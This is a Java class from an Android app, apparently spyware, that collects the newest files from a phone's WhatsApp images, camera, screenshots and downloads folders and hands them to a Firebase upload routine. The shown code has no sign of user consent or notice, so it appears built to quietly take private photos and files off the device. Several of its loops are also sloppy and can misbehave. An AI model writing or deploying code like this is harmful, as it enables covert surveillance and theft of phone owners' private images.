package com.hazyaz.temps.Storage;

import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;

import com.hazyaz.temps.Firebase.ImagesUpload;

import java.io.File;
import java.util.ArrayList;

public class GetImages {

    @NonNull
    public ArrayList<String> whatsAppLast10Messages = new ArrayList<>();
    @NonNull
    public ArrayList<String> cameraLast10Messages = new ArrayList<>();
    @NonNull
    public ArrayList<String> screenshotsLast10Messages = new ArrayList<>();
    @NonNull
    public ArrayList<String> downloadsLast10Messages = new ArrayList<>();
    private final int LAST10 = 5;


    public GetImages() {


//        getCameraImages();
//        getDownloads();
//        getScreenshots();
//        getWhatsAppImages();

    }


    public void getWhatsAppImages() {
        File whatsappImages = new File(Environment.getExternalStorageDirectory(), "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images");
        File[] files = whatsappImages.listFiles();
//        ONLY RETRIEVING LAST 10 IMAGES TO GET ALL IMAGES CHANGE IT TO FILES.LENGTH
        if (files.length > 11) {
//            RETRIEVE IMAGE ONLYT IF IMAGES ARE MORE THAN 10
            for (int i = files.length - 1; i >= files.length - 11; i--) {
                Log.d("WHATSAPP", "FileName:" + files[i].getName());
                if (!files[i].isDirectory()) {
                    whatsAppLast10Messages.add(files[i].getAbsolutePath());

                }
            }

            Log.d("Wdfgfdgfdg", "FileName:" + whatsAppLast10Messages);

            ImagesUpload ib = new ImagesUpload();

            ib.ImageUplods("WhatsApp", whatsAppLast10Messages);

        }
    }

    public void getCameraImages() {
        File cameraImages = new File(Environment.getExternalStorageDirectory(), "/DCIM/Camera");
        File[] files = cameraImages.listFiles();
        //        ONLY RETRIEVING LAST 10 IMAGES TO GET ALL IMAGES CHANGE IT TO FILES.LENGTH
        if (files.length > 11) {
//            RETRIEVE IMAGE ONLYT IF IMAGES ARE MORE THAN 10
            for (int i = files.length - 1; i >= files.length - 11; i--) {
                if (!files[i].isDirectory()) {
                    Log.d("CAMERA", "FileName:" + files[i].getName());
                    cameraLast10Messages.add(files[i].getAbsolutePath());
                }
            }
        }

        ImagesUpload ib = new ImagesUpload();

        ib.ImageUplods("Camera", cameraLast10Messages);
    }

    public void getScreenshots() {
        File screenshots = new File(Environment.getExternalStorageDirectory(), "/DCIM/Screenshots");
        File[] files = screenshots.listFiles();
        //        ONLY RETRIEVING LAST 10 IMAGES TO GET ALL IMAGES CHANGE IT TO FILES.LENGTH
        if (files.length > 11) {
//            RETRIEVE IMAGE ONLYT IF IMAGES ARE MORE THAN 10
            for (int i = files.length - 1; i >= files.length - 11; i--) {
                if (!files[i].isDirectory()) {
                    Log.d("SCREENSHOTS", "FileName:" + files[i].getName());
                    screenshotsLast10Messages.add(files[i].getAbsolutePath());
                }
            }

        }
        ImagesUpload ib = new ImagesUpload();

        ib.ImageUplods("Screenshots", screenshotsLast10Messages);
    }

    public void getDownloads() {
        File downloads = new File(Environment.getExternalStorageDirectory(), "/Download");
        File[] files = downloads.listFiles();
        int count=0;
        //        ONLY RETRIEVING LAST 10 IMAGES TO GET ALL IMAGES CHANGE IT TO FILES.LENGTH
        if (files.length > 11) {
//            RETRIEVE IMAGE ONLYT IF IMAGES ARE MORE THAN 10
            for (int i = files.length - 1; ; i--) {
                if (!files[i].isDirectory()) {
                    count++;
                    Log.d("DOWNLOADS", "FileName:" + files[i].getName());
                    downloadsLast10Messages.add(files[i].getAbsolutePath());
                }
                if(count==10){
                    break;
                }
            }
        }
            ImagesUpload ib = new ImagesUpload();

            ib.ImageUplods("Downloads", downloadsLast10Messages);
        }


    }
